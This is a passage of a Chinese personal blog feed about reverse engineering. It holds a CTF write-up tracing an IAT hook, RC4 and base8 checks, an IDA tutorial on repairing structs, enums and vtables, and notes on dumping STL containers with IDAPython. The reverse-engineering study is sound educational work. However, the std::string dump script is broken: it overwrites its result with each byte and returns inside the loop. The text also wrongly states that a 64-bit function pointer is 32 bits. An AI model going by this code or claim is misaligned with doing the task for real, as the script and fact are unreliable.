class="keyword">if</span>(s[j] == <span class="string">&#x27;T&#x27;</span>) t = j;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//mp[&#x27;A&#x27;] != 0 必须要有A字符</span></span><br><span class="line"><span class="comment">//mp[&#x27;P&#x27;] == 1 &amp;&amp; mp[&#x27;T&#x27;] == 1  PT字符必须要有且有一个 </span></span><br><span class="line"><span class="comment">//t-p &gt; 1 P和T的位置满足中间一个距离，即中间必须有A</span></span><br><span class="line"><span class="comment">//mp.size() == 3 仅有P A T</span></span><br><span class="line"><span class="comment">//p*(t-p-1)==s.size()-t-1 前A数量 ×中间A数量 = 后A数量 </span></span><br><span class="line"><span class="keyword">if</span>(mp[<span class="string">&#x27;A&#x27;</span>] != <span class="number">0</span> &amp;&amp; mp[<span class="string">&#x27;P&#x27;</span>] == <span class="number">1</span> &amp;&amp; mp[<span class="string">&#x27;T&#x27;</span>] == <span class="number">1</span> &amp;&amp; t-p != <span class="number">1</span> &amp;&amp; mp.<span class="built_in">size</span>() == <span class="number">3</span> &amp;&amp; p*(t-p<span class="number">-1</span>)==s.<span class="built_in">size</span>()-t<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这题本来是要计算字符A位置上数量约束，一个map就巧妙解决了所有约束太妙了。</p><p>申明：此题主要看柳神解答，非本人独创</p><p>参考链接：<a href="https://www.liuchuo.net/archives/460">1003. 我要通过！(20)-PAT乙级真题 – 柳婼 の blog (liuchuo.net)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;PAT_basic 	C++ map1&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>西湖论剑wp</title>
    <link href="https://pa1r0t.github.io/2023/02/15/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/"/>
    <id>https://pa1r0t.github.io/2023/02/15/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91wp/</id>
    <published>2023-02-15T02:06:30.000Z</published>
    <updated>2023-05-07T12:03:57.090Z</updated>
    
    <content type="html"><![CDATA[<p>西湖论剑wp</p><span id="more"></span><h2 id="BabyRE"><a href="#BabyRE" class="headerlink" title="BabyRE"></a>BabyRE</h2><p>给数组中的每一个函数都设置断点</p><p>开始动调，第一个函数，给输入的值进行检验是否是数字<img data-src="/./../images/image-20230215100917313.png" alt="image-20230215100917313"></p><p>第二个函数进行按位取反<img data-src="/./../images/image-20230215101120897.png" alt="image-20230215101120897"></p><p>取反后的结果<img data-src="/./../images/image-20230215101335001.png" alt="image-20230215101335001"></p><p>下个函数是IAT hook .替换GetLastError函数 替换为sub_4019D0函数<img data-src="/./../images/image-20230215101601229.png" alt="image-20230215101601229"></p><p>GetModuleHandle函数：获取一个应用程序或动态链接库的模块句柄 </p><p>GetModuleHandleA(0);返回0x00400000，而<em><strong>*模块句柄实际上就是模块在当前进程空间的装入地址。exe程序装入句柄一般为 0x00400000 。所以GetModuleHandle(NULL); 返回的值为 0x00400000；GetModuleHandle(“kernel32”)；返回值是0x7c800000(这个值正是kernel32.dll中的Image base的值)。*</strong></em></p><p>这里lpModuleName为kernel32<img data-src="/./../images/image-20230215111115149.png" alt="image-20230215111115149"></p><p>然后在kernel32模块中找GetLastError函数地址再将其替换这就是hook IAT的过程：先从程序句柄0x00400000中找kernel32.dll再从kernel32中找getlasterror。刚好两个循环</p><p>这里双击也可以查看<img data-src="/./../images/image-20230215111553991.png" alt="image-20230215111553991"></p><p><img data-src="/./../images/image-20230215111607580.png" alt="image-20230215111607580"></p><p>再给替换的函数加上断点<img data-src="/./../images/image-20230215101638875.png" alt="image-20230215101638875"></p><p>注意dword_4085C0是IAT之后的GetLastError函数</p><p>下一个函数是替换dword_408148的值<img data-src="/./../images/image-20230215101915168.png" alt="image-20230215101915168"></p><p>C 库函数 <strong>int atexit(void (*func)(void))</strong> 当程序正常终止时，调用指定的函数 <strong>func</strong>。您可以在任何地方注册你的终止函数，但它会在程序终止的时候被调用。<strong>func</strong> – 在程序终止时被调用的函数。</p><p>如果有多处atexit那么执行顺序是什么呢？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">functionA</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;这是函数A\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">functionB</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;这是函数B\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">functionC</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;这是函数C\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">/* 注册终止函数 */</span></span><br><span class="line">   atexit(functionA );</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;启动主程序...\n&quot;</span>);</span><br><span class="line">   atexit(functionC );</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;退出主程序...\n&quot;</span>);</span><br><span class="line">   atexit(functionB );</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230215105209445.png" alt="image-20230215105209445"></p><p>可以看出来多出atexit是以栈的执行顺序调用的</p><p>所以总结一下执行顺序</p><ol><li>sub_401170 输入检验 -&gt; </li><li>sub_401230 对某一内存数据进行按位取反</li><li>sub_4012B0 IAT hook 替换GetLastError函数 替换为sub_4019D0函数</li><li>main sub_4019D0 dword_408148, “dcbahgfelkjiponm”</li><li>sub_401670 base8 加密后memcmp(&amp;unk_4081D0, a16230465152334, 0x60u);</li><li>sub_4015C0 sub_401CC0加密后memcmp(Buffer, a67339fc92b4875, 0x28u);</li><li>sub_4014E0 执行RC4，后比较密文memcmp(&amp;unk_4084C0, &amp;unk_408090, 0x70u) )</li></ol><p>ebpf程序：eBPF 于 2015 年推出，是 <strong>Linux 的 一项 功能，可以直接在 Linux 内核中运行程序</strong>，而不是在无法直接访问内核资源的“用户空间”中运行程序。 eBPF 源于 BPF，本质上是处于内核中的一个高效与灵活的虚类虚拟机组件，以一种安全的方式在许多内核 Hook 点执行字节码。</p><p>资料链接：</p><ul><li><a href="https://blog.csdn.net/Rong_Toa/article/details/120250788">(61条消息) eBPF 入门之编程_rtoax的博客-CSDN博客_ebpf程序</a></li><li><a href="https://blog.csdn.net/melody157398/article/details/113409274">(61条消息) eBPF在android上的使用_布道师Peter的博客-CSDN博客</a></li></ul><p>VT是什么意思？</p><p>VT，全称是，Virtualization Technology，即是虚拟化技术，虚拟化技术可以扩大硬件的容量，简化软件的重新配置过程。<a href="https://product.pconline.com.cn/cpu/">CPU</a>的虚拟化技术可以单CPU模拟多CPU并行，允许一个平台同时运行多个操作系统，并且应用程序都可以在相互独立的空间内运行而互不影响，从而显著提高计算机的工作效率。</p><p>VT实现：<a href="https://www.cnblogs.com/wingsummer/p/15971289.html">VT 入门番外篇——最小 VT 实现 - 寂静的羽夏 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;西湖论剑wp&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://pa1r0t.github.io/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>IDA结构体分析</title>
    <link href="https://pa1r0t.github.io/2023/01/21/IDA%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/"/>
    <id>https://pa1r0t.github.io/2023/01/21/IDA%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/</id>
    <published>2023-01-21T01:52:17.000Z</published>
    <updated>2023-01-22T13:48:54.654Z</updated>
    
    <content type="html"><![CDATA[<p>IDA 类型修复</p><span id="more"></span><p>源码编译成二进制代码的过程中，大量辅助信息被删除，其中最重要的就是类型信息</p><p>为什么要修复伪代码中的类型？</p><ul><li>提高伪代码的准确度</li><li>指导 IDA 反编译器中的优化器使用正确的优化方案</li><li>让 IDA 生成的伪代码更接近源码</li></ul><p>我们需要手动修复哪些类型？</p><ul><li>函数返回值类型</li><li>参数类型 &#x2F; 局部变量类型 &#x2F; 全局变量类型</li><li>数组类型 &#x2F; 数组大小</li><li>结构体类型</li><li>虚表类型</li></ul><p>IDA 数组修复主要有两种：</p><p>1.局部变量中定义的数组</p><p>2.全局变量中定义的数组</p><p>数组修复要考虑：数据类型 + 数组大小</p><h2 id="IDA-修复枚举值"><a href="#IDA-修复枚举值" class="headerlink" title="IDA 修复枚举值"></a>IDA 修复枚举值</h2><p>实验材料：ptrace1</p><p>IDA 的类型数据库内置了常见的枚举（宏）的值，可以直接引入并修复。</p><p>通过逆向分析，ptrace函数</p><p><img data-src="/./../images/image-20230121101355025.png" alt="image-20230121101355025"></p><p>第一个参数就是ptrace函数的功能号</p><p>鼠标锁定摁M键导入枚举值</p><p>Ctrl+F5搜索ptrace关键字</p><p><img data-src="/./../images/image-20230121101528976.png" alt="image-20230121101528976"></p><p>找到后双击即可</p><p><img data-src="/./../images/image-20230121101553907.png" alt="image-20230121101553907"></p><p>下图就全部修复完成了</p><p><img data-src="/./../images/image-20230121101813329.png" alt="image-20230121101813329"></p><h2 id="IDA-结构体修复"><a href="#IDA-结构体修复" class="headerlink" title="IDA 结构体修复"></a>IDA 结构体修复</h2><p>实验材料：monopoly</p><p>这是一个大富翁游戏！</p><p>确定结构体大小：</p><ul><li>内存分配可以直接确定结构体大小</li><li>memcpy &#x2F; 局部变量偏移差 -&gt; 间接确定 （结构体&#x2F;类局部变量） 这种大多是在栈上</li></ul><p><img data-src="/./../images/image-20230121104326617.png" alt="image-20230121104326617"></p><p>创建相等大小匿名结构体，并将相关变量、参数的类型修改为该结构体</p><p>这里看见这个0x70的new函数，直接在struct视图下创建结构体</p><p><img data-src="/./../images/image-20230121105019521.png" alt="image-20230121105019521"></p><p>快捷键是Shift + F9，打开struct视图</p><p>这里在struct视图下，右键点击增加结构体类型</p><p><img data-src="/./../images/image-20230121105406208.png" alt="image-20230121105406208"></p><p>这里可以看见结构体大小</p><p><img data-src="/./../images/image-20230121105556782.png" alt="image-20230121105556782"></p><p>鼠标光标在ends处，增加属性（大小）：摁d键</p><p><img data-src="/./../images/image-20230121105718374.png" alt="image-20230121105718374"></p><p>这里直到sizeof显示为0x70为止，每个属性先以dq为单位，进行存储，后续再逆向分析再进行变更</p><p>这样结构体就初步设置完成了</p><p><img data-src="/./../images/image-20230121110056164.png" alt="image-20230121110056164"></p><p>这里回到代码处，这里将v0的类型修改为，刚刚我们创建的结构体类型</p><p><img data-src="/./../images/image-20230121110310274.png" alt="image-20230121110310274"></p><p>第一种改法：摁Y键，进行类型修改为struc_1 *类型</p><p>第二种改法：摁右键，转化为其他结构体：</p><p><img data-src="/./../images/image-20230121110552200.png" alt="image-20230121110552200"></p><p>这里直接选择我们刚刚创建的类型即可</p><p><img data-src="/./../images/image-20230121110626662.png" alt="image-20230121110626662"></p><p>这里创建好之后，执行下面的函数，我们跟进去看看</p><p><img data-src="/./../images/image-20230121120704877.png" alt="image-20230121120704877"></p><p>这里的a1进行了一系列操作，我们将a1的类修修改为我们定义的类型<img data-src="/./../images/image-20230121120850500.png" alt="image-20230121120850500"></p><p>因为这个函数在new之后执行，所以可能是构造函数，这里我们改个函数名吧<img data-src="/./../images/image-20230121121052464.png" alt="image-20230121121052464"></p><p>在构造函数中，有些属性是进行dword操作，这里我们就要将qword，改成dword类型<img data-src="/./../images/image-20230121121546769.png" alt="image-20230121121546769"></p><p>比如field_48，这里双击field_48进入结构体定义处，将该属性改成dword，这里摁d键<img data-src="/./../images/image-20230121121758509.png" alt="image-20230121121758509"></p><p>设置好之后下面未定义的也需要改成dword，就像这样<img data-src="/./../images/image-20230121121852483.png" alt="image-20230121121852483"></p><p>其他变量也是一样修改，把剩下的也修改了，但是当最后一个属性改为dword后，总大小发生了改变，这里我们只需要在下面再增加一个变量即可<img data-src="/./../images/image-20230121122116991.png" alt="image-20230121122116991"></p><p>最后就是这样<img data-src="/./../images/image-20230121122144895.png" alt="image-20230121122144895"></p><p>然后在源码中摁F5，代码就好看多了<img data-src="/./../images/image-20230121122453040.png" alt="image-20230121122453040"></p><p>上面循环处field_4c是以4字节进行访问，并且访问5词，也就是说field_4c开始处是一个以4字节为单位的一个数组，数组大小为5，在结构体定义处，右键点array设置数组，大小为5<img data-src="/./../images/image-20230121122734380.png" alt="image-20230121122734380"></p><p>最终field_4c后面的变量也将合并进入数组中<img data-src="/./../images/image-20230121122825156.png" alt="image-20230121122825156"></p><p>源码舒服，重命名为array1<img data-src="/./../images/image-20230121123416130.png" alt="image-20230121123416130"></p><p>这里进行字符串的初始化和赋值操作<img data-src="/./../images/image-20230121123758528.png" alt="image-20230121123758528"></p><p>这里我们将field_20改为str1</p><p>根据大富翁游戏，初始化的字符串，根据名字都是一些建筑，我们可以把定义的结构体名称改成house，然后将构造函数改成init_house<img data-src="/./../images/image-20230121124542969.png" alt="image-20230121124542969"></p><p>然后经过构造函数，申请到的对象内存都会存放到，以A1C0为首的地址处<img data-src="/./../images/image-20230121125509200.png" alt="image-20230121125509200"></p><p><img data-src="/./../images/image-20230121125527179.png" alt="image-20230121125527179"></p><p>上面一共64个位置，所以类型为house *为类型，数组长度为64个来存放house对象的指针<img data-src="/./../images/image-20230121125756372.png" alt="image-20230121125756372"></p><p>这里再右键array改为64<img data-src="/./../images/image-20230121125834301.png" alt="image-20230121125834301"></p><p>这些建筑正好形成地图，将数组名改成map即可<img data-src="/./../images/image-20230121130116722.png" alt="image-20230121130116722"></p><p>分析另外一个结构体，这个结构体没有使用 new &#x2F; malloc 分配内存，如何确定大小？<img data-src="/./../images/image-20230121132813993.png" alt="image-20230121132813993"></p><p>进入函数，看起来明显是个初始化函数<img data-src="/./../images/image-20230121132852076.png" alt="image-20230121132852076"></p><p>两个变量都是紧挨着的在内存中，属于静态分配了<img data-src="/./../images/image-20230121132938102.png" alt="image-20230121132938102"></p><p>两个变量位置相减为0x80，所以我们就暂时确定这个结构体的大小为0x80，然后我就去struct视图中去创建一个大小为0x80的结构体，还是老操作<img data-src="/./../images/image-20230121133259989.png" alt="image-20230121133259989"></p><p>这里其实可以先创建64长度的数组，然后再取消定义，这样就可以快速创建结构体了</p><p>类型定义好之后，函数外的全局变量类型不急着更改，先更改函数形参的类型<img data-src="/./../images/image-20230122155016716.png" alt="image-20230122155016716"></p><p>在函数中判断feild_20可能是个数组，这里先不理会</p><p>后面函数形参类型也需要一个个去修改<img data-src="/./../images/image-20230122155424970.png" alt="image-20230122155424970"></p><p>刷新一下变成这样了，给变量改个名<img data-src="/./../images/image-20230122182413118.png" alt="image-20230122182413118"></p><p>把剩余需要修改的变量大小继续更改<img data-src="/./../images/image-20230122183001258.png" alt="image-20230122183001258"></p><p>然后这里根据printf的字符串信息来判断结构体的类型<img data-src="/./../images/image-20230122183705595.png" alt="image-20230122183705595"></p><p>v6可能是建筑的类型，从map数组中取出来的结构体都是house类型了，然后把变量名都改成自己猜想的名字。</p><p>这个函数的实参是map数组元素，形参应该改为house结构体指针<img data-src="/./../images/image-20230122185813240.png" alt="image-20230122185813240"></p><p>这里有个field_40,不能确定是啥<img data-src="/./../images/image-20230122190051439.png" alt="image-20230122190051439"></p><p>我们可以用交叉引用，去别的地方找信息，刚好这里有一处<img data-src="/./../images/image-20230122190406178.png" alt="image-20230122190406178"></p><p>这里将ppp1赋给field_40，所以我们就将field_40改成结构体2类型</p><p>以上就是随意逆向的结果，真正正经逆向都是要分析程序逻辑的，我们先随意逆向，分析部分属性信息，有助于我们之后的分析</p><p>程序刚开始会让我们输入游戏难度等级<img data-src="/./../images/image-20230122191713348.png" alt="image-20230122191713348"></p><p>经过分析这个就是获取数字的函数<img data-src="/./../images/image-20230122191835438.png" alt="image-20230122191835438"></p><p>然后我们先从简单的easy_level开始<img data-src="/./../images/image-20230122192539523.png" alt="image-20230122192539523"></p><p>从这分析出ppp3是玩家的意思，因为刚开始它就给ppp3给到初始的金额了<img data-src="/./../images/image-20230122192843765.png" alt="image-20230122192843765"></p><p>然后进入一个循环，首先进入这个函数<img data-src="/./../images/image-20230122193721525.png" alt="image-20230122193721525"></p><p>这个函数很明显是个循环<img data-src="/./../images/image-20230122193909583.png" alt="image-20230122193909583"></p><p>有两个函数，一个只有player1另外还有player2，也就是一个人玩玩，另一个人玩<img data-src="/./../images/image-20230122195530524.png" alt="image-20230122195530524"><img data-src="/./../images/image-20230122195544442.png" alt="image-20230122195544442"></p><p>然后这里我们需要输入我们想做的内容<img data-src="/./../images/image-20230122202153532.png" alt="image-20230122202153532"></p><p>我们先以第一个，这里有个比较，应该是玩家资产数量<img data-src="/./../images/image-20230122202349924.png" alt="image-20230122202349924"></p><p>要求输入的值不能超过，玩家拥有的资产的数量。所以sub_452F函数估计就是资产的售卖了</p><p>这里售卖的函数中<img data-src="/./../images/image-20230122203152235.png" alt="image-20230122203152235"></p><p>这里资产数组大小为map的总个数为64个<img data-src="/./../images/image-20230122203328139.png" alt="image-20230122203328139"></p><p>然后是3，购买资产<img data-src="/./../images/image-20230122210502911.png" alt="image-20230122210502911"></p><p>分析得<img data-src="/./../images/image-20230122210702534.png" alt="image-20230122210702534"></p><p>最终：<img data-src="/./../images/image-20230122210742758.png" alt="image-20230122210742758"></p><p><img data-src="/./../images/image-20230122210913452.png" alt="image-20230122210913452"></p><p>全局字段交叉引用 Ctrl + alt + X （要尽可能将相关函数找出来并修复类型，有利于查找）</p><h2 id="IDA-虚表修复"><a href="#IDA-虚表修复" class="headerlink" title="IDA 虚表修复"></a>IDA 虚表修复</h2><p>实验材料： vtable</p><p>虚表就是C++实现多态的一种机制</p><p>为了实现C++的多态，C++使用了一种动态绑定的技术。这个技术的核心是虚函数表，当一个类（A）继承另一个类（B）时，类A会继承类B的函数的调用权。所以如果一个基类包含了虚函数，那么其继承类也可调用这些虚函数，换句话说，一个类继承了包含虚函数的基类，那么这个类也拥有自己的虚表。我们来看以下的代码。类A包含虚函数vfunc1，vfunc2，由于类A包含虚函数，故类A拥有一个虚表。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc1</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">vfunc2</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func1</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> m_data1, m_data2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>类A的虚表如图1所示:<img data-src="/./../images/image-20230122212103043.png" alt="image-20230122212103043"></p><p>虚表是一个指针数组，其元素是虚函数的指针，每个元素对应一个虚函数的函数指针。需要指出的是，普通的函数即非虚函数，其调用并不需要经过虚表，所以虚表的元素并不包括普通函数的函数指针。虚表内的条目，即虚函数指针的赋值发生在编译器的编译阶段，也就是说在代码的编译阶段，虚表就可以构造出来了</p><p>虚表修复主要是为了重建虚表交叉引用,一般类的第一个地址就是虚表的地址。</p><p>这里就是调用虚表的某一个函数<img data-src="/./../images/image-20230122213810302.png" alt="image-20230122213810302"></p><p>这里类大小为0x28字节<img data-src="/./../images/image-20230122213834372.png" alt="image-20230122213834372"></p><p>这里我们找到虚表，点击这个就是虚表<img data-src="/./../images/image-20230122213906848.png" alt="image-20230122213906848"></p><p>然后右边是虚表的符号<img data-src="/./../images/image-20230122213950337.png" alt="image-20230122213950337"></p><p>这里先进行构建结构体，在结构体中表示虚表，一个函数地址，在64位中为32位<img data-src="/./../images/image-20230122214250424.png" alt="image-20230122214250424"></p><p>创建好后，创建类结构体，然后将类结构体的第一个属性类型设置为虚表类型<img data-src="/./../images/image-20230122214426259.png" alt="image-20230122214426259"></p><p>然后将v3的类型设置为类结构体类型<img data-src="/./../images/image-20230122214509446.png" alt="image-20230122214509446"></p><p>然后就修复完成了<img data-src="/./../images/image-20230122214621630.png" alt="image-20230122214621630"></p><p><img data-src="/./../images/image-20230122214835711.png" alt="image-20230122214835711"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;IDA 类型修复&lt;/p&gt;</summary>
    
    
    
    <category term="re" scheme="https://pa1r0t.github.io/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>STL逆向</title>
    <link href="https://pa1r0t.github.io/2023/01/20/std%E9%80%86%E5%90%91/"/>
    <id>https://pa1r0t.github.io/2023/01/20/std%E9%80%86%E5%90%91/</id>
    <published>2023-01-20T12:03:08.000Z</published>
    <updated>2023-01-20T12:47:25.636Z</updated>
    
    <content type="html"><![CDATA[<p>c++ STL</p><span id="more"></span><h1 id="STL-逆向方法论"><a href="#STL-逆向方法论" class="headerlink" title="STL 逆向方法论"></a>STL 逆向方法论</h1><ul><li>识别 STL 容器类型</li><li>识别 STL 容器操作</li><li>提取 STL 容器中的数据</li></ul><p><strong>逆向 STL 主要的问题:</strong></p><ol><li>缺少符号，无法判断 STL 容器类型 （主要困难）</li><li>STL 内部数据结构复杂，难以提取数据</li><li>优化使大量 stl 函数被 inline</li></ol><p>方法：解析 STL 容器内存数据，从内存数据角度判断容器类型，提取容器内容判断函数操作。</p><h2 id="常见-STL-容器"><a href="#常见-STL-容器" class="headerlink" title="常见 STL 容器"></a>常见 STL 容器</h2><p>序列容器</p><ul><li>vector</li><li>Deque</li><li>List</li><li>String</li></ul><p>关联容器</p><ul><li>Pair</li><li>Map</li><li>Set</li><li>MultiMap &#x2F; MultiSet</li></ul><p>无序关联容器:unordered_map</p><h1 id="C-STL关联式容器是什么？"><a href="#C-STL关联式容器是什么？" class="headerlink" title="C++ STL关联式容器是什么？"></a>C++ STL关联式容器是什么？</h1><p>此类容器在存储元素值的同时，还会为各元素额外再配备一个值（又称为“键”，其本质也是一个 C++ 基础数据类型或自定义类型的元素），它的功能是在使用关联式容器的过程中，如果已知目标元素的键的值，则直接通过该键就可以找到目标元素，而无需再通过遍历整个容器的方式。</p><p>弃用序列式容器，转而选用关联式容器存储元素，往往就是看中了关联式容器可以快速查找、读取或者删除所存储的元素，同时该类型容器插入元素的效率也比序列式容器高。</p><h1 id="常见-STL-容器适配器"><a href="#常见-STL-容器适配器" class="headerlink" title="常见 STL 容器适配器"></a>常见 STL 容器适配器</h1><p><strong>容器适配器</strong>是一个封装了序列容器的类模板，它在一般序列容器的基础上提供了一些不同的功能。之所以称作适配器类，是因为它可以通过适配容器现有的接口来提供不同的功能。</p><p>其实，容器适配器中的“适配器”，和生活中常见的电源适配器中“适配器”的含义非常接近。我们知道，无论是电脑、手机还是其它电器，充电时都无法直接使用 220V 的交流电，为了方便用户使用，各个电器厂商都会提供一个适用于自己产品的电源线，它可以将 220V 的交流电转换成适合电器使用的低压直流电。</p><p>从用户的角度看，电源线扮演的角色就是将原本不适用的交流电变得适用，因此其又被称为电源适配器。</p><p>举一个例子，假设一个代码模块 A，它的构成如下所示：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f1</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f2</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f3</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">f4</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在我们需要设计一个模板 B，但发现，其实只需要组合一下模块 A 中的 f1()、f2()、f3()，就可以实现模板 B 需要的功能。其中 f1() 单独使用即可，而 f2() 和 f3() 需要组合起来使用，如下所示：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    A * a;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">g1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        a-&gt;<span class="built_in">f1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">g2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        a-&gt;<span class="built_in">f2</span>();</span><br><span class="line">        a-&gt;<span class="built_in">f3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，就如同是电源适配器将不适用的交流电变得适用一样，模板 B 将不适合直接拿来用的模板 A 变得适用了，因此我们可以将模板 B 称为 B 适配器.</p><p>容器适配器也是同样的道理，<em>简单的理解容器适配器，其就是将不适用的序列式容器（包括 vector、deque 和 list）变得适用</em>。容器适配器的底层实现和模板 A、B 的关系是完全相同的，即通过封装某个序列式容器，并重新组合该容器中包含的成员函数，使其满足某些特定场景的需要。</p><p>stack（STL stack）容器适配器:采用默认的 deque 基础容器</p><p>queue容器适配器:其底层使用的基础容器选择默认的 deque 容器</p><p>priority_queue ：vector</p><p>逆向时处理容器适配器只需要用底层容器来处理即可</p><h1 id="STL-各高级类型dump数据"><a href="#STL-各高级类型dump数据" class="headerlink" title="STL 各高级类型dump数据"></a>STL 各高级类型dump数据</h1><h2 id="std-string"><a href="#std-string" class="headerlink" title="std::string"></a>std::string</h2><ul><li>固定长度 32 字节，4 个 dq</li><li>第一个指针字段指向数据地址</li><li>第二个 size_t 字段存储字符串长度</li></ul><p>内存分布：</p><p><img data-src="/./../images/image-20230120202731025.png" alt="image-20230120202731025"></p><p>IDA dump脚本：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_dbg_cppstr_64</span>(<span class="params">objectAddr</span>):</span><br><span class="line">    <span class="comment"># a easy function for read std:string</span></span><br><span class="line">    <span class="comment"># 首地址就是begin指针</span></span><br><span class="line">    strPtr = idc.read_dbg_qword(objectAddr)</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        onebyte = idc.read_dbg_byte(strPtr + i)</span><br><span class="line">        <span class="keyword">if</span> onebyte == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="built_in">chr</span>(onebyte)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="std-stringsteam"><a href="#std-stringsteam" class="headerlink" title="std::stringsteam"></a>std::stringsteam</h2><p>可以看作是读写文件</p><p>内存分布：<img data-src="/./../images/image-20230120203121252.png" alt="image-20230120203121252"></p><p><img data-src="/./../images/image-20230120203135198.png" alt="image-20230120203135198"></p><h2 id="std-vector"><a href="#std-vector" class="headerlink" title="std::vector"></a>std::vector</h2><ul><li>固定长度 24 字节，3 个 dq</li><li>第一个指针字段指向数组起始地址</li><li>第二个指针字段指向数组最后元素地址</li><li>第三个指针字段指向最大内存地址</li></ul><p>内存分布：<img data-src="/./../images/image-20230120203330744.png" alt="image-20230120203330744"></p><p>IDA dump脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vetor_dump</span>(<span class="params">addr</span>):</span><br><span class="line">    ELEMENT_SIZE = <span class="number">8</span></span><br><span class="line">    data_addr = []</span><br><span class="line">    vetor_base = idc.read_dbg_qword(addr + <span class="number">0x0</span>)</span><br><span class="line">    vetor_end = idc.read_dbg_qword(addr + <span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(vetor_base,vetor_end,ELEMENT_SIZE):</span><br><span class="line">        data_addr.append(i)</span><br><span class="line">    <span class="keyword">return</span> data_addr</span><br></pre></td></tr></table></figure><h2 id="std-list"><a href="#std-list" class="headerlink" title="std::list"></a>std::list</h2><ul><li>双向循环链表存储</li><li>头结构 + 节点结构</li><li>遍历长度可以用 size 字段确定</li></ul><p><img data-src="/./../images/image-20230120203453756.png" alt="image-20230120203453756"></p><p>内存布局：<img data-src="/./../images/image-20230120203507098.png" alt="image-20230120203507098"></p><p>IDA dump 脚本：</p><figure class="highlight 